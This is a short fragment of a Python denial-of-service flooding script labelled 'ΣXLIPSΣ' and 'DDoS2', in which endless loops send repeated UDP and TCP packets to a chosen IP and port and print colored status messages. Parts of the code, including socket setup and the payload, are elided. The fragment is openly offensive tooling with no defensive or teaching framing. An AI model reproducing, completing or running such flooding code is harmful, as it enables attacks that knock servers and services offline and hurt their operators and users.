	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(bytes,addr)
			print(Σ +"\033[96m ΣXLIPSΣ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
		except:
			print("\033[96m[Σ] ΣXLIPSΣ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
...
def DDoS2():
	...
	while True:
		try:
			...
			for x in range(times):
				s.send(bytes)
			print(Σ +"\u001b[31m ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(host, port))

		except:
			s.close()
			print("\u001b[31m[Σ] ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(host, port))
